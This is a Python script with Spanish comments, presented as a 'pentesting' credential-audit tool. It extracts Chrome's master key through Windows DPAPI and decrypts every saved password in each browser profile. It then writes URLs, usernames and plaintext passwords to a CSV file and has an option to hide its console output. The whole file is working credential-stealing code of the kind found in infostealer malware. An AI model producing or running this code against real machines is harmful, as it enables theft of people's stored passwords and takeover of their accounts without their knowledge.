import os
import re
import sys
import json
import base64
import sqlite3
import shutil
import csv
import logging
import argparse
from pathlib import Path
from datetime import datetime

# Condicional para win32crypt (solo Windows)
try:
    import win32crypt
except ImportError:
    win32crypt = None

from Cryptodome.Cipher import AES

# Configuración de Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("pentest_audit.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class ChromiumDecryptor:
    def __init__(self, browser_name="Chrome"):
        self.browser_name = browser_name
        self.user_profile = Path(os.environ.get('USERPROFILE', ''))
        
        # Rutas dinámicas basadas en Chromium
        self.user_data_path = self.user_profile / "AppData/Local/Google/Chrome/User Data"
        self.local_state_path = self.user_data_path / "Local State"

    def get_secret_key(self):
        """Extrae la llave maestra de la configuración del navegador."""
        if not self.local_state_path.exists():
            logger.error(f"Archivo Local State no encontrado en: {self.local_state_path}")
            return None

        try:
            with open(self.local_state_path, "r", encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:] # Quitar prefijo DPAPI
            
            if win32crypt:
                secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return secret_key
            else:
                logger.error("Error: win32crypt no disponible (¿Ejecutando fuera de Windows?)")
                return None
        except Exception as e:
            logger.exception(f"Error al obtener la Master Key: {e}")
            return None

    def decrypt_password(self, ciphertext, secret_key):
        """Descifra una contraseña individual usando AES-GCM."""
        try:
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload).decode()
            return decrypted_pass
        except Exception as e:
            # Versiones antiguas (<80) no son compatibles con este método GCM
            return f"[ERROR: {str(e)}]"

    def process_passwords(self, output_file="decrypted_passwords.csv", verbose=False):
        """Itera sobre perfiles y extrae las credenciales."""
        secret_key = self.get_secret_key()
        if not secret_key:
            return

        profiles = [p for p in self.user_data_path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
        
        if not profiles:
            logger.warning("No se encontraron perfiles de usuario de Chrome.")
            return

        with open(output_file, mode='w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["Index", "Profile", "URL", "Username", "Password"])

            for profile_path in profiles:
                login_db = profile_path / "Login Data"
                if not login_db.exists():
                    continue

                temp_db = Path("Loginvault_tmp.db")
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    found_count = 0
                    for index, (url, user, ciphertext) in enumerate(cursor.fetchall()):
                        if url and user and ciphertext:
                            password = self.decrypt_password(ciphertext, secret_key)
                            writer.writerow([index, profile_path.name, url, user, password])
                            found_count += 1
                            if verbose:
                                logger.info(f"[{profile_path.name}] Capturado: {url} | User: {user}")

                    logger.info(f"Perfil {profile_path.name}: {found_count} credenciales extraídas.")
                    
                    cursor.close()
                    conn.close()
                except Exception as e:
                    logger.error(f"Error procesando perfil {profile_path.name}: {e}")
                finally:
                    if temp_db.exists():
                        temp_db.unlink()

def main():
    parser = argparse.ArgumentParser(description="Auditoría de Credenciales Chromium - Suite Pentesting")
    parser.add_argument("-o", "--output", default="decrypted_passwords.csv", help="Nombre del archivo de salida (CSV)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Mostrar capturas en tiempo real en consola")
    parser.add_argument("--silent", action="store_true", help="No mostrar nada en consola (solo archivo log)")
    
    args = parser.parse_args()

    if args.silent:
        logger.handlers[1].setLevel(logging.CRITICAL) # Ocultar consola

    logger.info("Iniciando extracción de credenciales...")
    
    decryptor = ChromiumDecryptor()
    decryptor.process_passwords(output_file=args.output, verbose=args.verbose)
    
    logger.info(f"Auditoría finalizada. Resultados en: {args.output}")

if __name__ == "__main__":
    main()
